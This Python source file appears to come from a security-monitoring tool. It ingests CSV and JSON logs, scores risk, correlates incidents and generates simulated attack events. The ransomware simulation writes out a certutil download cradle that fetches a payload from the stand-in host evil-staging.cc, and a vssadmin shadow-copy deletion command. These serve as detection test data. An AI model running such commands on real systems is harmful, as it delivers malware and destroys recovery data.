import csv
import io
import json
import uuid
from datetime import datetime, timezone
from typing import List, Dict, Any, Tuple, Optional
import logging

from backend.app.schemas.event import EventCreate, BulkIngestResponse
from backend.app.detection.risk_engine import risk_engine
from backend.app.correlation.correlator import correlator
from backend.app.database import get_repository

logger = logging.getLogger("ai_cyberguard.ingestion")


class IngestionService:
    """
    Robust Ingestion Engine supporting JSON and CSV security logs,
    normalization, detection scoring, and automatic incident correlation.
    """

    @staticmethod
    def parse_csv_content(csv_text: str) -> List[Dict[str, Any]]:
        """Parses CSV string into a list of normalized event dictionaries."""
        reader = csv.DictReader(io.StringIO(csv_text.strip()))
        records = []
        for row in reader:
            # Map standard or variant CSV column names
            clean_row: Dict[str, Any] = {}
            for k, v in row.items():
                if not k:
                    continue
                clean_k = k.strip().lower().replace(" ", "_").replace("-", "_")
                clean_row[clean_k] = v.strip() if isinstance(v, str) else v

            # Handle metadata parsing if present in a column
            meta = {}
            if "metadata" in clean_row:
                try:
                    meta = json.loads(clean_row["metadata"])
                except Exception:
                    meta = {"raw_meta": clean_row["metadata"]}

            # Required or default values
            event_type = clean_row.get("event_type") or clean_row.get("type") or "security_alert"
            action = clean_row.get("action") or "log"
            description = clean_row.get("description") or clean_row.get("message") or f"{event_type} event logged"

            record = {
                "event_id": clean_row.get("event_id") or f"EVT-{uuid.uuid4().hex[:6].upper()}",
                "timestamp": clean_row.get("timestamp") or datetime.now(timezone.utc).isoformat(),
                "event_type": event_type,
                "user": clean_row.get("user") or clean_row.get("username") or None,
                "device": clean_row.get("device") or clean_row.get("hostname") or clean_row.get("workstation") or None,
                "source_ip": clean_row.get("source_ip") or clean_row.get("src_ip") or clean_row.get("ip") or None,
                "destination": clean_row.get("destination") or clean_row.get("dest") or clean_row.get("target") or None,
                "action": action,
                "status": clean_row.get("status") or "success",
                "severity": clean_row.get("severity") or "low",
                "description": description,
                "metadata": meta
            }
            records.append(record)
        return records

    @staticmethod
    def parse_json_content(json_text: str) -> List[Dict[str, Any]]:
        """Parses JSON text into a list of event dictionaries."""
        data = json.loads(json_text)
        if isinstance(data, dict):
            # Check if wrapped in an "events" key or single event
            if "events" in data and isinstance(data["events"], list):
                return data["events"]
            return [data]
        elif isinstance(data, list):
            return data
        else:
            raise ValueError("JSON must contain an object or an array of event objects")

    async def process_and_ingest_events(
        self,
        raw_events: List[Dict[str, Any]],
        correlate_immediately: bool = True
    ) -> BulkIngestResponse:
        """Processes, normalizes, detects risk, persists events, and optionally triggers correlation."""
        repo = await get_repository()
        total_received = len(raw_events)
        normalized_events: List[Dict[str, Any]] = []
        errors: List[str] = []
        suspicious_count = 0
        now_str = datetime.now(timezone.utc).isoformat()

        for idx, item in enumerate(raw_events):
            try:
                ev_id = item.get("event_id") or f"EVT-{uuid.uuid4().hex[:6].upper()}"
                ev_dict = {
                    "event_id": ev_id,
                    "timestamp": item.get("timestamp") or now_str,
                    "event_type": item.get("event_type", "security_alert"),
                    "user": item.get("user"),
                    "device": item.get("device"),
                    "source_ip": item.get("source_ip"),
                    "destination": item.get("destination"),
                    "action": item.get("action", "log"),
                    "status": item.get("status", "success"),
                    "description": item.get("description", "Security log entry"),
                    "metadata": item.get("metadata", {}) or {}
                }

                # Evaluate detection engine
                det = risk_engine.analyze_event(ev_dict)
                ev_dict["risk_score"] = det.risk_score
                ev_dict["triggered_rules"] = [r.name for r in det.triggered_rules]
                ev_dict["severity"] = det.severity

                if det.is_suspicious:
                    suspicious_count += 1

                normalized_events.append(ev_dict)
            except Exception as e:
                errors.append(f"Error processing event index {idx}: {str(e)}")

        if normalized_events:
            await repo.save_events_bulk(normalized_events)

        created_incident_ids: List[str] = []
        if correlate_immediately and normalized_events:
            # Correlate all events currently in repository to build complete attack stories
            all_events = await repo.get_all_events(limit=500)
            correlated_incidents = correlator.correlate_events(all_events)
            for inc in correlated_incidents:
                await repo.save_incident(inc.model_dump())
                if inc.incident_id not in created_incident_ids:
                    created_incident_ids.append(inc.incident_id)

        msg = f"Successfully ingested {len(normalized_events)} of {total_received} events. {suspicious_count} suspicious indicators detected."
        if created_incident_ids:
            msg += f" Correlated {len(created_incident_ids)} incident(s): {', '.join(created_incident_ids)}."

        return BulkIngestResponse(
            total_received=total_received,
            total_ingested=len(normalized_events),
            suspicious_count=suspicious_count,
            incidents_created=len(created_incident_ids),
            incident_ids=created_incident_ids,
            errors=errors,
            message=msg
        )

    def generate_simulated_scenario_events(
        self,
        scenario: str,
        user: str = "sarah",
        device: str = "PC-042"
    ) -> List[Dict[str, Any]]:
        """Generates realistic synthetic events for quick SOC attack simulation."""
        now = datetime.now(timezone.utc)
        base_ts = now.strftime("%Y-%m-%dT%H:%M:%S") + "Z"

        if scenario == "ransomware_staging":
            return [
                {
                    "event_id": f"EVT-RS-{uuid.uuid4().hex[:4].upper()}",
                    "timestamp": base_ts,
                    "event_type": "process_execution",
                    "user": user,
                    "device": device,
                    "source_ip": "10.0.8.22",
                    "action": "process_spawn",
                    "status": "success",
                    "severity": "high",
                    "description": "Suspicious certutil download cradle fetching remote executable payload",
                    "metadata": {"process_name": "certutil.exe", "command_line": "certutil -urlcache -split -f http://evil-staging.cc/payload.exe"}
                },
                {
                    "event_id": f"EVT-RS-{uuid.uuid4().hex[:4].upper()}",
                    "timestamp": base_ts,
                    "event_type": "process_execution",
                    "user": user,
                    "device": device,
                    "source_ip": "10.0.8.22",
                    "action": "process_spawn",
                    "status": "success",
                    "severity": "critical",
                    "description": "Attempted shadow copy deletion via vssadmin utility to inhibit system recovery",
                    "metadata": {"process_name": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet"}
                },
                {
                    "event_id": f"EVT-RS-{uuid.uuid4().hex[:4].upper()}",
                    "timestamp": base_ts,
                    "event_type": "file_access",
                    "user": user,
                    "device": device,
                    "destination": "FILESERVER-02",
                    "action": "bulk_encrypt_simulation",
                    "status": "success",
                    "severity": "critical",
                    "description": "High-velocity simulated file extension modification on network share",
                    "metadata": {"files_modified_per_sec": 420, "extension_appended": ".locked"}
                }
            ]
        elif scenario == "password_spray":
            return [
                {
                    "event_id": f"EVT-PS-{uuid.uuid4().hex[:4].upper()}",
                    "timestamp": base_ts,
                    "event_type": "authentication",
                    "user": "multiple_accounts",
                    "device": "EDGE-VPN-01",
                    "source_ip": "194.26.29.112",
                    "action": "login",
                    "status": "failure",
                    "severity": "medium",
                    "description": "Cluster of rapid failed logins across 14 distinct user identities from external IP",
                    "metadata": {"failed_attempts": 14, "auth_protocol": "Kerberos"}
                },
                {
                    "event_id": f"EVT-PS-{uuid.uuid4().hex[:4].upper()}",
                    "timestamp": base_ts,
                    "event_type": "login",
                    "user": user,
                    "device": device,
                    "source_ip": "194.26.29.112",
                    "action": "login",
                    "status": "success",
                    "severity": "high",
                    "description": "Successful external login for account following spray campaign",
                    "metadata": {"is_new_location": True, "auth_protocol": "VPN"}
                }
            ]
        else:  # data_exfiltration
            return [
                {
                    "event_id": f"EVT-EX-{uuid.uuid4().hex[:4].upper()}",
                    "timestamp": base_ts,
                    "event_type": "file_access",
                    "user": user,
                    "device": device,
                    "destination": "DB-01",
                    "action": "database_query",
                    "status": "success",
                    "severity": "critical",
                    "description": "Mass extraction query executed on corporate customer database",
                    "metadata": {"records_queried": 50000, "table": "credit_cards"}
                },
                {
                    "event_id": f"EVT-EX-{uuid.uuid4().hex[:4].upper()}",
                    "timestamp": base_ts,
                    "event_type": "network_activity",
                    "user": user,
                    "device": device,
                    "source_ip": device,
                    "destination": "45.33.32.156",
                    "action": "outbound_data_transfer",
                    "status": "success",
                    "severity": "critical",
                    "description": "Anomalous multi-gigabyte outbound encrypted network transfer to unrecognized external cloud IP",
                    "metadata": {"bytes_sent": 2147483648, "destination_port": 443}
                }
            ]


ingestion_service = IngestionService()
